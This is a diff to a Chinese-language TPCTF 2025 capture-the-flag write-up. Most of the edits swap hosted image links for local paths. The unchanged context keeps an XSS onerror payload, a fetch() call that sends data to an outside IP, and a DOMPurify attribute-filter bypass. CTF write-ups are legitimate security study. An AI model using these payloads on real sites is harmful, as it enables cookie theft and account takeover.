@@ -29,7 +29,7 @@ Layout：
 
 Post:
 
-```javaScript
+```javascript
 ccc" onerror="javascript:alert(1)
 ```
 
@@ -48,7 +48,7 @@ aaaaaaaa" onerror="fetch('http://47.237.137.xxx:7777?' +
 
 DOMPurify 在设置了{ ALLOWED_ATTR: [] }时，并不会删除所有的属性。aria-和 data-属性还会存在。
 
-![img](https://dlut-sss.feishu.cn/space/api/box/stream/download/asynccode/?code=MjFhMWIyZmM5ODU1ZDNjZDA3Y2NiN2UwMGI0NjY4NzdfNEtsQnFzVFdYc3d3VDQyWkx6T2dqSVFMeUFJd3cxOVpfVG9rZW46SDloVWJFNUlMbzZ5aEh4OWZ4emNvNWJxbndqXzE3NTg4ODI2ODE6MTc1ODg4NjI4MV9WNA)
+![img](/images/TPCTF2025/img01.png)
 
 layout:
 
@@ -66,7 +66,7 @@ layout:
 
 根据[CVE-2023-48219](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#cve-2023-48219-tinymce)，相同原理，通过取代字符可以绕过
 
-![img](https://dlut-sss.feishu.cn/space/api/box/stream/download/asynccode/?code=YWU4ZWQ4MDk2NDY0NzQ1ZjY3MjI5MTlmMmQ5NTI0MzNfQ3U2R2VhZXR2SzVGamZJT2JHSWNUV1l3cXJSTXVsRllfVG9rZW46WHhLcmJqSEpRbzJ1cWF4eHhGaWNZTWRlbnpoXzE3NTg4ODI2ODE6MTc1ODg4NjI4MV9WNA)
+![img](/images/TPCTF2025/img02.png)
 
 Layout:
 
@@ -105,11 +105,11 @@ print(res.text)
 
 ## chase
 
-![img](https://dlut-sss.feishu.cn/space/api/box/stream/download/asynccode/?code=NTZlMjQ4ZTMyYjc0NmM5MzQxOTMzOWIxNDczNjFhNThfZHpIamhGYXJTR3ExZktBYU1GalpPQUt5MmNUNnI5NDJfVG9rZW46TWRWWmJmRmdab210UTB4bGpKcWN6YTJxbnllXzE3NTg4ODI2ODE6MTc1ODg4NjI4MV9WNA)
+![img](/images/TPCTF2025/img03.png)
 
 第二部分根据导出表可知
 
-![img](https://dlut-sss.feishu.cn/space/api/box/stream/download/asynccode/?code=YmU0NTA5MGNjZGY5NDliMTcwZmNkYzBiNWFiZTkxM2NfdTJkNlozQ25PVE5xUW9lUzA2QnJUS29lYWkwcXhpS0lfVG9rZW46TGE2S2JmTGE4b3RFRmN4WXBtRWNDSlA2blBkXzE3NTg4ODI2ODE6MTc1ODg4NjI4MV9WNA)
+![img](/images/TPCTF2025/img04.png)
 
 鼠标附上去可以看见映射关系
 
@@ -117,7 +117,7 @@ print(res.text)
 
 查找 PPU Memory 搜索 26 2C 21 27
 
-![img](https://dlut-sss.feishu.cn/space/api/box/stream/download/asynccode/?code=YzM4ODIyZWQ5NjBlNmJiNjA5ZTc4YmRmMDZiMTgwOWVfNXV4RzVSMVhlcWxPemtiSmgwMHBvMjBtM1NHR3gxYk9fVG9rZW46UVUwdWIyVW40b3dkUUp4RlBZb2NVVE5SbkFlXzE3NTg4ODI2ODE6MTc1ODg4NjI4MV9WNA)
+![img](/images/TPCTF2025/img05.png)
 
 再根据对应表翻译出第二部分
 
@@ -271,7 +271,7 @@ for i in range(len(hash_chain)-1):
 
 动态调试定位到基址
 
-![img](https://dlut-sss.feishu.cn/space/api/box/stream/download/asynccode/?code=ODMyMGY0YTMzNTY0MmUxMDRhZWEyNmI1ZTA3YzNmN2ZfMEtrMGZRbXlYNVg3eWdMREZjMnlYeG9aVE5rYWthaGNfVG9rZW46V200N2IyS1NXbzV4TFV4VkpncGNCMWxDbmhkXzE3NTg4ODI2ODE6MTc1ODg4NjI4MV9WNA)
+![img](/images/TPCTF2025/img06.png)
 
 ```python
 import idaapi
@@ -896,7 +896,7 @@ if __name__ == '__main__':
 
 脚本爆破成功结果如下，后续用 data 恢复 flag
 
-![img](https://dlut-sss.feishu.cn/space/api/box/stream/download/asynccode/?code=NzAzZjY5NGE3OTk5NTI5MTJmNGUyOTYzNDg2MDk2OGNfQm9kRFJKbzNrbVQ0dVA1bDU1VUFWRldvdWZBRk1TbjJfVG9rZW46V2xna2JWZlVvb281cWF4SlZFNWNNY3VLbnZiXzE3NTg4ODI2ODE6MTc1ODg4NjI4MV9WNA)
+![img](/images/TPCTF2025/img07.png)
 
 ```python
 with open("data.txt") as f:
@@ -928,7 +928,7 @@ print(len(set(col)))
 
 观察 client.py 发现，如果客户端同时发送消息请求，会存在条件竞争情况，即使用了同一状态的密钥流进行了不同明文的加密，所以导致解密时会出现问题，也呼应了题目描述里的内容。在这一情况下，明文^密钥流=密文，所以在密文中取两块等长的子串异或，即为原明文互相异或，该异或结果应该小于可见字符的最大值，用此作为筛选条件。得到这一异或结果后，已知明文中包含 TPCTF{，即可用刚才异或结果与该明文进行异或，得到其他等长的明文，随后再去扩充这些得到的明文，逐步得到完全的消息。部分恢复明文如下：
 
-![img](https://dlut-sss.feishu.cn/space/api/box/stream/download/asynccode/?code=NmE1ODJhNTA1Njg3NzJjYWEyMmFmNTRkNTA3MzkxNzNfcDBXeGNNdVFoTE1MM281WE9laVl6VDhHdkVNbUJReTNfVG9rZW46VWxoR2JEUWk0b1pWaHZ4dml1QmM0VW02bjhlXzE3NTg4ODI2ODE6MTc1ODg4NjI4MV9WNA)
+![img](/images/TPCTF2025/img08.png)
 
 首先得到了 part1 的 flag，直接猜测后续还有 part2，用'the second part of flag'去当作已知明文异或，可同理恢复 flag2 附近的明文，最后得到 flag2。
 
@@ -987,7 +987,7 @@ for s1_idx, s2_idx, sub_xor_idx, xor_output in filtered_results:
 
 这里藏东西了
 
-![img](https://dlut-sss.feishu.cn/space/api/box/stream/download/asynccode/?code=YWU2ZDkzOGRmMmUyMzM4MzQ5ZTJlZTRiMDYwNzRjNzdfcjZwdnhBMGt6Zk1UcnBGanE5c3lSc0V5QmJIMmVYNUtfVG9rZW46TzlsUmJLeHhab3hmU3h4ejgxVGNqZFJjbnZDXzE3NTg4ODI2ODE6MTc1ODg4NjI4MV9WNA)
+![img](/images/TPCTF2025/img09.png)
 
 发现都是\uDB40\uDDxx，推测只与最后的一个字节有关
 
@@ -1042,7 +1042,7 @@ print(result)
 
 交过的 flag 如图
 
-![img](https://dlut-sss.feishu.cn/space/api/box/stream/download/asynccode/?code=NGNiNWRkZGY1MDIyY2NkNzI1NjU5YzBjN2YzYjNiZDVfYVBoS3g2YnllbDY3S2ExMWZtM3h6UHRrWGdRekZzQ1dfVG9rZW46UnVLcWJMUTZnb0NDdTl4dkVoeGNodGgybnFmXzE3NTg4ODI2ODE6MTc1ODg4NjI4MV9WNA)
+![img](/images/TPCTF2025/img10.png)
 
 s->5 的混淆真的恶心，为尝试此而写的脚本如下
 
@@ -1071,6 +1071,6 @@ for i in ch:
 
 And the scoreboard accepted my guesswork!!!
 
-![img](https://dlut-sss.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTYwNWEwYWIxY2E0ZjljNmIxOTY5ODkxYWNlMGIzZmVfcnB3NDEwcTFmdTJONTJKRjJUZGpNMDZoQWNkWEVEOWlfVG9rZW46UXh4YWJiWXBqbzFuMUN4UDJGSGM4SlcwblBiXzE3NTg4ODI2ODE6MTc1ODg4NjI4MV9WNA)
+![img](/images/TPCTF2025/img11.png)
 
 L.M.A.O.
